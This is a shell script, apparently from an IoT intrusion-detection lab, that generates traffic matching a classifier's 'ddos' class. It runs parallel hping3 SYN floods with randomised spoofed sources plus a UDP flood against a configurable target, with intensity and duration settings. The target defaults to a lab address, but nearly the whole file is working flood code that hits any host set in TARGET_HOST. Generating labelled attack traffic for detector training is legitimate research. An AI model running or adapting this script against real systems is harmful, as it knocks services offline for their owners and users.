#!/bin/sh
# ddos_attack.sh  ->  intended model class: "ddos"
#
# TRUSTLab training fingerprint for `ddos` (medians): TCP, very long flow
# duration with large idle gaps and low effective pkts/s, mostly unidirectional
# (3 fwd / 0 bwd), no completed handshake (ACK 0).
# LAB CONSTRAINT: iot-victim rotates its pcap every 5 s (tcpdump -G 5), so flows
# cannot exceed ~5 s here; the 30 s-idle median is unreachable without raising
# the victim's rotation window. We therefore target the *reachable* ddos shape:
# high-volume half-open TCP SYN flood (many SYN, no ACK) + a UDP amplification-
# style mix. Confirm the class with the diagnostic; bump victim -G if needed.

echo "[DDOS] Starting..."
TARGET="${TARGET_HOST:-172.20.0.50}"
INTENSITY="${INTENSITY:-medium}"
DURATION="${DURATION:-60}"
END=$(($(date +%s) + DURATION))

rnd() { awk "BEGIN{srand();print int(rand()*$1)+1}"; }

case "$INTENSITY" in
    low)    BURST=3; SLEEP_MAX=5; PAR=2 ;;
    high)   BURST=8; SLEEP_MAX=2; PAR=6 ;;
    *)      BURST=5; SLEEP_MAX=3; PAR=4 ;;  # medium
esac

while [ "$(date +%s)" -lt "$END" ]; do
    # Parallel half-open SYN floods from (kernel-)random source ports -> many
    # unidirectional SYN-only TCP flows (ACK 0), the ddos signature.
    i=0
    while [ "$i" -lt "$PAR" ]; do
        timeout "$BURST" hping3 -S -p 80 --flood --rand-source "$TARGET" 2>/dev/null &
        i=$((i + 1))
    done
    timeout "$BURST" hping3 --udp -p 80 --flood --rand-source "$TARGET" 2>/dev/null
    wait
    sleep "$(rnd "$SLEEP_MAX")"
done
echo "[DDOS] Done."
